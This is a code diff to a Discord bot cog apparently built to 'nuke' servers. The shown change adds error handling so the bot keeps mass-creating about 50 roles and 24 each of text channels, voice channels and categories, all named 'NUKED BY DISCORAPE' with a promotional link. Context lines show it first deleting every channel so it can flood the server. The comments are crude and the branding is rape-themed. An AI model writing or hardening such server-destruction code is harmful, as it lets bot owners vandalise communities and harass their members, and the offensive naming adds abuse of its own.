@@ -162,12 +162,15 @@ class nukes(commands.Cog):
         print(f"{Fore.RED}[-]ROLE > {Fore.RESET}Starting to nuke roles")
 
         for i in range(1, 50):
-            await ctx.guild.create_role(
-                name=f"NUKED BY DISCORAPE https://daddie.xyz {i}"
-            )
-            print(
-                f"{Fore.RED}[-]ROLE > {Fore.RESET}Made role NUKED BY DISCORAPE https://daddie.xyz {i}"
-            )
+            try:
+                await ctx.guild.create_role(
+                    name=f"NUKED BY DISCORAPE https://daddie.xyz {i}"
+                )
+                print(
+                    f"{Fore.RED}[-]ROLE > {Fore.RESET}Made role NUKED BY DISCORAPE https://daddie.xyz {i}"
+                )
+            except Exception as e:
+                print(f"Error while makign role.\n\nError: {e}")
         # SPAM ROLE SHIT CANT BE ASKED TO MAKE IT
         for channel in ctx.guild.channels:
             try:
@@ -178,24 +181,27 @@ class nukes(commands.Cog):
         # delete all channels so we can flood that shit lmfao
 
         for i in range(1, 25):
-            await ctx.guild.create_text_channel(
-                name=f"NUKED-BY-DISCORAPE-{i}-https://daddie.xyz"
-            )
-            print(
-                f"{Fore.RED}[-]CHANNEL > {Fore.RESET}Made text channel! NUKED-BY-DISCORAPE-{i}-https://daddie.xyz"
-            )
-            await ctx.guild.create_voice_channel(
-                name=f"NUKED BY DISCORAPE {i} https://daddie.xyz"
-            )
-            print(
-                f"{Fore.RED}[-]CHANNEL > {Fore.RESET}Made voice channel! NUKED BY DISCORAPE {i} https://daddie.xyz"
-            )
-            await ctx.guild.create_category(
-                name=f"NUKED BY DISCORAPE {i} https://daddie.xyz"
-            )
-            print(
-                f"{Fore.RED}[-]CHANNEL > {Fore.RESET}Made category! NUKED BY DISCORAPE {i} https://daddie.xyz"
-            )
+            try:
+                await ctx.guild.create_text_channel(
+                    name=f"NUKED-BY-DISCORAPE-{i}-https://daddie.xyz"
+                )
+                print(
+                    f"{Fore.RED}[-]CHANNEL > {Fore.RESET}Made text channel! NUKED-BY-DISCORAPE-{i}-https://daddie.xyz"
+                )
+                await ctx.guild.create_voice_channel(
+                    name=f"NUKED BY DISCORAPE {i} https://daddie.xyz"
+                )
+                print(
+                    f"{Fore.RED}[-]CHANNEL > {Fore.RESET}Made voice channel! NUKED BY DISCORAPE {i} https://daddie.xyz"
+                )
+                await ctx.guild.create_category(
+                    name=f"NUKED BY DISCORAPE {i} https://daddie.xyz"
+                )
+                print(
+                    f"{Fore.RED}[-]CHANNEL > {Fore.RESET}Made category! NUKED BY DISCORAPE {i} https://daddie.xyz"
+                )
+            except Exception as e:
+                print(f"Error while making channels\nError: {e}")
         print(f"{Fore.RED}[-]NUKE > {Fore.RESET}Nuking finished!")
 
     @commands.command()
